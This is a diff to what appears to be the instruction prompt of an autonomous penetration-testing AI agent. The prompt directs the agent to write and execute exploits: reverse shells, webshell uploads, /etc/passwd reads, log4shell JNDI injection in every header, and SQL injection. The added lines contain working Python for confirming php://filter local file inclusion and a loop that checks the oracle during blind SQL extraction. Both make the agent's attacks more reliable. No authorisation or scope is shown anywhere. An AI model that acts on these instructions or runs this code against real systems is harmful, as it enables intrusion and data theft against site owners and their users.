@@ -653,6 +653,22 @@ VPN / IP environment (from NETWORK_ENV section):
      - Do NOT just describe — write and EXECUTE the actual exploit code.
   4. If exploit_class is "rce": attempt command injection, rev-shell, or upload webshell.
   5. If exploit_class is "lfi": attempt /etc/passwd, php://filter base64, and log poisoning.
+     php://filter VALIDATION (v4.9.4 — CRITICAL):
+       REAL LFI success: response body is a LARGE BASE64 BLOCK (no HTML tags, just A-Za-z0-9+/=)
+       FALSE POSITIVE: response is homepage/error HTML (contains <html>, <body>, same size as normal page)
+       MANDATORY check:
+         r = requests.get(url + "?param=php://filter/convert.base64-encode/resource=index")
+         normal_r = requests.get(url)  # baseline
+         if r.status_code != 200: print("LFI: NOT VULNERABLE"); continue
+         import re as _lfi_re
+         has_b64 = bool(_lfi_re.search(r'(?:^|[\s])([A-Za-z0-9+/]{200,}={0,2})', r.text, _lfi_re.M))
+         is_html = bool(_lfi_re.search(r'<html|<!DOCTYPE|<body|<meta', r.text, _lfi_re.I))
+         same_size = abs(len(r.content) - len(normal_r.content)) < 500
+         if is_html or same_size or not has_b64:
+             print(f"LFI: FALSE POSITIVE (redirected to homepage — {len(r.content)}B)")
+             continue
+         print(f"LFI: CONFIRMED — base64 content found ({len(r.text)}B)")
+     NEVER report LFI confirmed if: response is HTML OR response size ≈ normal page size.
   6. If exploit_class is "sql_injection": attempt UNION-based, error-based, and time-based.
   7. If exploit_class is "log4shell": inject ${jndi:ldap://...} payload in all HTTP headers.
   8. If exploit_class is "memory_corruption": generate fuzzing payload with pattern cyclic.
@@ -2213,10 +2229,34 @@ When fingerprint shows gnuboard5 / g5_ variables in page:
     FALSE payload: param=value' AND '1'='2
     If both return IDENTICAL size (e.g., both 44103 bytes) → oracle INVALID → STOP.
     RULE: After oracle validation, if diff < 10 bytes → assume measurement noise → oracle INVALID.
+    RULE: If diff < 50 bytes on a page > 50KB → likely dynamic noise → oracle INVALID → STOP.
   If the parameter returns identical responses for TRUE/FALSE:
     → It is NOT injectable via boolean blind
     → Try ERROR-based, UNION-based, or TIME-based instead
     → Do NOT run char-by-char extraction on an invalid oracle (wastes hundreds of requests)
+
+  ── 14-A. Oracle Failure Auto-Detection During Extraction (v4.9.4) ──
+  DURING char-by-char extraction, monitor extracted characters:
+    If 3 consecutive identical characters are extracted (e.g., 'a','a','a') → STOP IMMEDIATELY.
+    Reason: an invalid oracle defaults to matching 'a' every round → result is 'aaaa...'
+    This is NOT a real extracted value — it is oracle noise.
+  CODE PATTERN (MANDATORY — add to every extraction loop):
+    consecutive_same = 0
+    last_char = None
+    for pos in range(1, max_len + 1):
+        char = extract_char(pos)
+        if char == last_char:
+            consecutive_same += 1
+        else:
+            consecutive_same = 0
+            last_char = char
+        if consecutive_same >= 3:
+            print("⛔ ORACLE_FAILURE: 3 consecutive same chars → extraction aborted.")
+            result = None  # Do NOT report as finding
+            break
+        result_str += char
+  RULE: If extraction is aborted due to ORACLE_FAILURE → do NOT print "✅" or report as BINGO.
+        Print "⛔ Oracle failed — result unreliable" instead.
 
   ── 15. WAITFOR Delay — Strict Validation Required ──
   WAITFOR DELAY '0:0:5' means the server-side execution pauses 5 seconds.
